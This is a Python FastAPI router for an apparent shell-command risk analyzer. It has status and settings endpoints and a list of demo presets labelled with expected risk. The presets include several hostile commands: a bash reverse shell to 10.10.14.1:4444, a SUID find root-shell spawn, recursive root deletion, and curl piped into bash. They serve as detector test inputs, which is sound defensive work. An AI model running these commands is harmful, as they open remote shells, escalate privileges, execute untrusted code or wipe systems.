import getpass
import os
import platform
import socket
from typing import Any, Dict, List, Optional
from fastapi import APIRouter, Depends
from pydantic import BaseModel
from app.core.analyzer import AnalyzerService
from app.core.executor import CommandExecutor
from app.core.vector_db import CmdCaliperVectorStore
from app.dependencies import get_analyzer, get_executor, get_sandbox_client, get_vector_store
from app.services.sandbox_client import SandboxClient

router = APIRouter(prefix="/api", tags=["System & Settings"])


class SettingsUpdateRequest(BaseModel):
    ai_provider: Optional[str] = None
    ai_model: Optional[str] = None
    groq_api_key: Optional[str] = None
    groq_model: Optional[str] = None
    openrouter_api_key: Optional[str] = None
    gemini_api_key: Optional[str] = None
    openai_api_key: Optional[str] = None
    ollama_base_url: Optional[str] = None


@router.get("/status")
async def get_system_status(
    analyzer: AnalyzerService = Depends(get_analyzer),
    executor: CommandExecutor = Depends(get_executor),
    sandbox_client: SandboxClient = Depends(get_sandbox_client),
    vector_store: CmdCaliperVectorStore = Depends(get_vector_store),
) -> Dict[str, Any]:
    """Returns telemetry including AI status, CmdCaliper vector status, current CWD, host details, and Docker sandbox status."""
    sandbox_health = await sandbox_client.get_health()
    tools = [
        {"name": t.name, "available": t.is_available()}
        for t in analyzer.pipeline.tools
    ]

    cc_status = vector_store.get_status()
    return {
        "status": "online",
        "provider_status": analyzer.get_provider_status(),
        "active_provider": os.getenv("LLM_PROVIDER", ""),
        "groq_configured": bool(os.getenv("GROQ_API_KEY")),
        "groq_model": os.getenv("GROQ_MODEL", "groq/compound-mini"),
        "tools": tools,
        "current_cwd": executor.current_cwd,
        "prompt_path": executor.get_prompt_path(),
        "cmdcaliper": cc_status,
        "cmdcaliper_available": bool(cc_status.get("available", False)),
        "cmdcaliper_vectors": cc_status.get("vector_count", 0),
        "host": {
            "hostname": socket.gethostname(),
            "user": getpass.getuser(),
            "platform": platform.platform(),
            "python_version": platform.python_version(),
        },
        "sandbox": sandbox_health,
        "sandbox_available": bool(sandbox_health.get("available", False)),
        "docker_available": bool(sandbox_health.get("docker_available", False)),
    }


@router.post("/settings")
async def update_settings(
    req: SettingsUpdateRequest,
    analyzer: AnalyzerService = Depends(get_analyzer),
) -> Dict[str, Any]:
    """Updates runtime AI configuration."""
    if req.ai_provider is not None:
        os.environ["LLM_PROVIDER"] = req.ai_provider
    if req.groq_api_key is not None:
        os.environ["GROQ_API_KEY"] = req.groq_api_key
    if req.groq_model is not None:
        os.environ["GROQ_MODEL"] = req.groq_model
    if req.openrouter_api_key is not None:
        os.environ["OPENROUTER_API_KEY"] = req.openrouter_api_key
    if req.gemini_api_key is not None:
        os.environ["GEMINI_API_KEY"] = req.gemini_api_key
    if req.openai_api_key is not None:
        os.environ["OPENAI_API_KEY"] = req.openai_api_key
    if req.ai_model is not None:
        os.environ["AI_MODEL"] = req.ai_model
    if req.ollama_base_url is not None:
        os.environ["OLLAMA_BASE_URL"] = req.ollama_base_url

    analyzer.reconfigure(provider=req.ai_provider, model=req.ai_model)

    return {
        "success": True,
        "provider_status": analyzer.get_provider_status(),
    }


@router.get("/presets")
async def get_command_presets() -> List[Dict[str, Any]]:
    """Returns curated presets for quick demonstration and testing."""
    return [
        {
            "category": "Safe Inspection",
            "title": "List directory details",
            "command": "ls -la --color=auto /var/log",
            "expected_risk": "SAFE",
        },
        {
            "category": "Pipeline & Search",
            "title": "Find large log files with AST pipe",
            "command": "find /var/log -type f -name '*.log' -size +10M | head -n 5",
            "expected_risk": "SAFE",
        },
        {
            "category": "CmdCaliper Threat Detection",
            "title": "Reverse TCP Bash Shell (T1059.004)",
            "command": "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1",
            "expected_risk": "CRITICAL",
        },
        {
            "category": "Privilege Escalation & SUID",
            "title": "GTFOBins SUID find -exec spawn",
            "command": "sudo find / -exec /bin/sh \\; -quit",
            "expected_risk": "CRITICAL",
        },
        {
            "category": "Archive & Compression",
            "title": "Extract tar archive with flags",
            "command": "tar -xzvf archive.tar.gz -C /tmp/unpacked",
            "expected_risk": "CAUTION",
        },
        {
            "category": "Critical / System Alteration",
            "title": "Dangerous recursive root deletion",
            "command": "rm -rf / --no-preserve-root",
            "expected_risk": "CRITICAL",
        },
        {
            "category": "Network & Remote Execution",
            "title": "Curl piped into shell execution",
            "command": "curl -fsSL https://raw.githubusercontent.com/example/install.sh | bash",
            "expected_risk": "CRITICAL",
        },
    ]
